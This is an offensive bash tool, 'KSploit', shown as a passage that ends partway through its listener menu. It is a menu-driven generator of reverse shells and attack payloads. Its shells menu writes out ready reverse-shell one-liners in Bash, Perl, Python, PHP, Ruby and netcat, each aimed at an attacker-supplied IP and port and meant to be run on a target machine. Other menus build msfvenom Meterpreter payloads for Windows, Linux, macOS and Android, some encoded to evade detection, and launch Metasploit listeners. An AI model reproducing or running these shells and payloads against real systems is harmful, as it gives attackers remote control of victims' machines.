#!/bin/bash
# Script: KSploit v 0.1
# Author: kaotickj
# Website: kdgwebsolutions.com

#########################################
#----------------- VARS ----------------#
#########################################
ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
EADDR=$(ip addr | grep eth0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
WADDR=$(ip addr | grep wlan0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
ME="$(whoami) 👽 $(hostname)"
ME=$(echo $ME | tr '[:lower:]' '[:upper:]')
wdir=$(pwd)
THISIP=$(dig @resolver4.opendns.com myip.opendns.com +short -4)

###########################################
#---------------  Colors  ----------------#
###########################################

C=$(printf '\033')
FGR="${C}[48;5;196m"
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
FGG="${C}[48;5;22m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
FGB="${C}[48;5;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
FGC="${C}[48;5;237m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m"
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m"
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

###############################################
locals()
{
    echo "               ${FGC}| Your current adapter address(es)  |${NC}${YELLOW}"
    if [ -z "$EADDR" ]  &&  [ -z "$ADDR" ]  &&  [ -z "$WADDR" ];
      then
       echo "               ${FGR}|       ⚠️   NOT CONNECTED   ⚠️       |${NC}${YELLOW}"
    fi
    if [ -n "${EADDR}" ];
      then
       echo "               | ETH0: $EADDR"| sed 's/$/ /g'
    fi
    if [ -n "${ADDR}" ]; 
      then
       echo "               | TUN0: $ADDR"| sed 's/$/ /g'
    fi 
    if [ -n "${WADDR}" ]; 
      then
       echo "               | WLAN0: $WADDR"| sed 's/$/ /g'
    fi

#    echo "               | IPV4: $THISIP"| sed 's/$/ /g'
    echo "               -------------------------------------"
    return 
}

errors()
{
   if [ ! "${error}" = "" ]
    then
     echo "${LG}"
     echo "            ${FGR}          $error         ${NC}"
     error="" 
   fi
   return 
}

pickfile()
{
	local f="$exepath"
	local m="$0: file $f failed to load."
	if [ -f $f ] 
	then
		m="$0: $f file loaded."
	else
		m="$0: $f is not a file."
		dialog --title "Load file" --clear --msgbox "$m" 10 50
		goto pick;
	fi 
	echo ${NC}
	dialog --title "Load file" --clear --msgbox "$m" 10 50
	return
}

goodbye()
{
  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
  echo
  echo
  exit 0;
}

badbye()
{
  echo  "${RED}	  |${FGR}💀${LG}            FATAL ERROR!!             💀 ${NC}${RED}|"
  echo 
  echo
  exit 1;
}

################################################################################
# Shells Menu
################################################################################
shells()
{    
clear
echo ${YELLOW}"
   ____  _          _ _     
  / ___|| |__   ___| | |___ 
  \___ \| '_ \ / _ \ | / __|
   ___) | | | |  __/ | \__ \\
  |____/|_| |_|\___|_|_|___/
   🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
	"${LIGHT_MAGENTA}
   echo "  Use the shells menu to quickly and easily craft shell code and scripts. Choose from Bash, PERL, Ruby, PHP, python and necat options.  ${YELLOW}" |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #shelly:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}       KSploit Shells Menu Options:          ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐚${GREEN} 1 ${BLUE}Bash shell script.                  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🦪${GREEN} 2 ${BLUE}PERL shell script.                  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐍${GREEN} 3 ${BLUE}Python shell script.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐍${GREEN} 4 ${BLUE}Python3 shell script.               ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    📈${GREEN} 5 ${BLUE}PHP shell script.                   ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🌸${GREEN} 6 ${BLUE}Ruby shell script.                  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐱${GREEN} 7 ${BLUE}Netcat shell script.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|"
   echo
   echo "     if you need an advanced php shell, go here:    "
   echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" |fmt -w 80
   errors	
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,6,7,q]    " opt
   echo
   echo
   locals
   case "$opt" in
	1)
	    touch $wdir/shell.sh
            echo
            echo "              ${FGC}   Crafting a Bash Shell script   :   ${NC}${YELLOW}"
	    read -p '	    Set Attacker IP* ' attackerip;
    	    read -p '	    Set Attacker Port* ' attackerport;
   	    echo "	    🐚🐚🐚 Generating bash shell script ..."	
	    echo -e "#!/bin/bash" > $wdir/shell.sh
	    echo -e "bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1" >> $wdir/shell.sh
	    echo
	    sleep 1		    
  	    echo -e "${FGG}${YELLOW}🐚🐚🐚   Bash Shell script saved to $wdir/shell.sh  ${NC}${YELLOW}"
	    chmod +x $wdir/shell.sh
	    echo
	    echo -e "or run ${FGC}${LIGHT_CYAN} bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1 ${NC}${GREEN} on the target machine" 
	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC} 
            goto shelly;
	  ;;
	2)
	    touch $wdir/shell.pl
            echo
            echo "              ${FGC}   Crafting a PERL Shell script   :   ${NC}${YELLOW}"
	    read -p '	    Set Attacker IP* ' attackerip
    	    read -p '	    Set Attacker Port* ' attackerport
  	    echo "	    🦪🦪🦪 Generating perl shell script ..."	
	    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > $wdir/shell.pl
	    echo
	    sleep 1		    
  	    echo -e "         ${FGG}${YELLOW}   🦪🦪🦪   Perl Shell script saved to $wdir/shell.pl   🦪🦪🦪   ${NC}${YELLOW}"${GREEN}
	    chmod +x $wdir/shell.pl
	    echo	
	    echo -e "or run ${FGC}${LIGHT_CYAN} perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ${NC}${GREEN} on the target machine" 
	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto shelly;
	  ;;
	3)
	    touch $wdir/shell.py
		echo
		echo "              ${FGC}   Crafting a Python Shell script   :   ${NC}${YELLOW}"
	    read -p '	    Set Attacker IP* ' attackerip
		read -p '	    Set Attacker Port* ' attackerport
   	    echo "	    🐍🐍🐍 Generating python shell script ..."	
	    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell.py
	    echo
	    sleep 1		    
  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python Shell script saved to $wdir/shell.py   🐍🐍🐍   ${NC}${YELLOW}"
	    chmod +x $wdir/shell.py
	    echo
	    echo -e "         or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" 
	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto shelly;
	  ;;
	 4)
	    touch $wdir/shell3.py
		echo
		echo "              ${FGC}   Crafting a Python3 Shell script   :   ${NC}${YELLOW}"
	    read -p '	    Set Attacker IP* ' attackerip
		read -p '	    Set Attacker Port* ' attackerport
   	    echo "	    🐍🐍🐍 Generating python3 shell script ..."	
	    echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell3.py
	    echo
	    sleep 1		    
  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python3 Shell script saved to $wdir/shell3.py   🐍🐍🐍   ${NC}${YELLOW}"
	    chmod +x $wdir/shell3.py
	    echo
	    echo -e "         or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" 
	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto shelly;
	  ;;
	5) 
	    touch shell.php
	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
	    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
	    echo -e "${DG} - - - -> PHP Shell script saved to $wdir/shell.php"${GREEN}
	    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
	    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
	    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto shelly;
	  ;; 
	6)
	    touch shell.rb
	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
            goto shelly;
	 ;;					    
	 7) 
	    touch $wdir/netcat.sh
            echo
            echo "              ${FGC} Crafting a Netcat Shell script   :   ${NC}${YELLOW}"
	    read -p '	    Set Attacker IP* ' attackerip
    	    read -p '	    Set Attacker Port* ' attackerport
   	    echo -e "	    🐱🐱🐱 Generating netcat shell script ..."	
	    echo -ne '            🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
   	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    sleep .1
	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
	    echo -e "           ${DG} 🐱🐱🐱 Netcat Shell script saved to $wdir/netcat.sh "
	    echo -e "            ${DG}((RUN WITH ./netcat.sh on the target))"${GREEN}
	    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f" > $wdir/netcat.sh
	    echo -e "            or run: ${LIGHT_CYAN} "
	    echo
	    echo -e "        ${FGC}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f ${NC}${GREEN}" '\n\n' "           on the target machine"
	    echo
	    pause  '          '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	    goto shelly;
	  ;;
         q)
	    clear
	    goto $start
         ;;
 	 *)
	    clear 
	    error="$opt is not a valid option!"      	
	    goto shelly;
	 ;;
    esac

}

################################################################################
# Payloads Menu
################################################################################
payloads()
{
  clear
  echo ${LIGHT_CYAN}'
   ____             _                 _     
  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
	      |___/                         
   💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
 '${LIGHT_MAGENTA} 
   echo "  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #pay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}        KSploit Payloads Menu Options:       ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Payloads.                   ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Payloads.                     ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🍎${GREEN} 3 ${BLUE}Mac OSX Reverse TCP.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🤖${GREEN} 4 ${BLUE}Android Meterpreter Reverse TCP.    ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐍${GREEN} 5 ${BLUE}Unix Reverse Python.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to main menu.                  ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
   echo
   echo
   locals
   case "$opt" in
        1)
          winpayloads
        ;;  
	2)
	  linpayloads
	;;	
	3)
          echo
          echo "          ${FGC}   Crafting a Mac OSX Reverse TCP Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating mac osx payload ..."	
	  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $wdir/shell.macho
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.macho saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto pay;
	;;
	4)
          echo
          echo "          ${FGC}  Crafting an Android Meterpreter Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating android meterpreter payload ..."	
	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdr/shell.apk
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.apk saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto pay;
	;;  
	5)
	  echo
          echo "         ${FGC}    Crafting a Reverse Python Payload  :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating reverse python payload ..."	
	  msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto pay;
	;;
        q)
          clear
          goto $start
        ;;
        *)
          clear 
          error="$opt is not a valid option!"      	
          goto pay;
        ;;
   esac    
}

################################################################################
# Linux Payloads Menu
################################################################################
linpayloads()
{
  clear
  echo ${LIGHT_CYAN}'
   ____             _                 _        
  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
	      |___/                         
   🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧	    
'${LIGHT_MAGENTA}
   echo "  Use the linux payloads menu to quickly and easily craft metasploit payloads for linux targets." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #linpay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}      KSploit Linux Payloads Menu Options:   ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 1 ${BLUE}Linux x86 Meterpreter Reverse TCP.  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux x64 Meterpreter Reverse TCP.  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
   echo
   echo
   locals
   case "$opt" in
	1)
	  echo 
          echo "  ${FGC}    Crafting a Linux x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating linux x86 meterpreter payload ..."	
	  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell.elf
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.elf saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto linpay;
	;;
	2)
	  echo 
          echo "  ${FGC}    Crafting a Linux x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating linux x64 meterpreter payload ..."	
	  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell64.elf
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.elf saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto linpay;
	;;
	q)
	  clear
	  payloads
	;;
	*)
          clear 
          errorq="$opt is not a valid option!"      	
          goto linpay;
	;;
   esac
}

################################################################################
# Windows Payloads Menu
################################################################################
winpayloads()
{
  clear
  echo ${LIGHT_CYAN}'
   ____             _                 _        
  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
  	      |___/                         
   🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️ 🖥️	    
'${LIGHT_MAGENTA}
   echo "  Use the windows payloads menu to quickly and easily craft metasploit payloads for windows targets." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #winpay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}    KSploit Windows Payloads Menu Options:   ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows x86 Meterpreter Reverse TCP.${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 2 ${BLUE}Windows x64 Meterpreter Reverse TCP.${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
   echo
   echo
   locals
   case "$opt" in
	1)
	  echo 
	  echo "  ${FGC}    Crafting a Windows x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating shikata ga nai encoded payload ..."	
	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $wdir/shell.exe
	  echo
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.exe saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto winpay;
	;;
	2)
	  echo 
	  echo "  ${FGC}    Crafting a Windows x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
	  echo "	    💰💰💰 Generating xor encoded payload ..."	
	  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $wdir/shell64.exe
	  echo
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.exe saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto winpay;
	;;
	q)
	  clear
	  payloads
	;;
	*)
          clear 
          error="$opt is not a valid option!"      	
          goto winpay;
	;;
   esac
}

################################################################################
# Listeners Menu
################################################################################
listeners()
{
  clear
  echo ${LIGHT_CYAN}'
   _     _     _                           
  | |   (_)___| |_ ___ _ __   ___ _ __ ___ 
  | |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
  | |___| \__ \ ||  __/ | | |  __/ |  \__ \
  |_____|_|___/\__\___|_| |_|\___|_|  |___/
   👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂
'${LIGHT_MAGENTA}
   echo "  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #listen:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}      KSploit Listeners Menu Options:        ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Meterpreter Reverse TCP.    ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Meterpreter Reverse TCP.      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🍎${GREEN} 3 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐚${GREEN} 4 ${BLUE}Bash Reverse TCP listener.          ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
   echo
   echo
   locals
   case "$opt" in
        1)
            echo
            touch $wdir/meterpreter.rc
            echo "    ${FGC}  Crafting a Windows Meterpreter Reverse TCP Listener :    ${NC}${YELLOW}"
            echo use multi/handler > $wdir/meterpreter_windows.rc
            echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> $wdir/meterpreter_windows.rc
            read -p '	    Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
            read -p '	    Set Attacker Port* ' attackerport
            echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
#            echo set ExitOnSession false >> $wdir/meterpreter_windows.rc
            echo run -j -z >> $wdir/meterpreter_windows.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_windows.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            cat $wdir/meterpreter_windows.rc | xterm -e msfconsole -r $wdir/meterpreter_windows.rc 
	    sleep 2
            goto listen;
            ;;
        2)
            echo
            touch $wdir/meterpreter_linux.rc
            echo "    ${FGC}    Crafting a Linux Meterpreter Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> $wdir/meterpreter_linux.rc
	    read -p '	    Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> $wdir/meterpreter_linux.rc
            read -p '	    Set Attacker Port* ' attackerport
            echo set LPORT $attackerport >> $wdir/meterpreter_linux.rc
            echo set ExitOnSession false >> $wdir/meterpreter_linux.rc
            echo exploit -j -z >> $wdir/meterpreter_linux.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_linux.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            cat $wdir/meterpreter_linux.rc | xterm -e msfconsole -r $wdir/meterpreter_linux.rc 
	    sleep 2
            goto listen;
            ;;
        3)
            echo
            touch $wdir/meterpreter_mac.rc
            echo "          ${FGC}    Crafting an OSX Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_mac.rc
	    read -p '	    Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> $wdir/meterpreter_mac.rc
            read -p '	    Set Attacker Port* ' attackerport
            echo set LPORT $attackerport >> $wdir/meterpreter_mac.rc
            echo set ExitOnSession false >> $wdir/meterpreter_mac.rc
            echo exploit -j -z >> $wdir/meterpreter_mac.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_mac.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
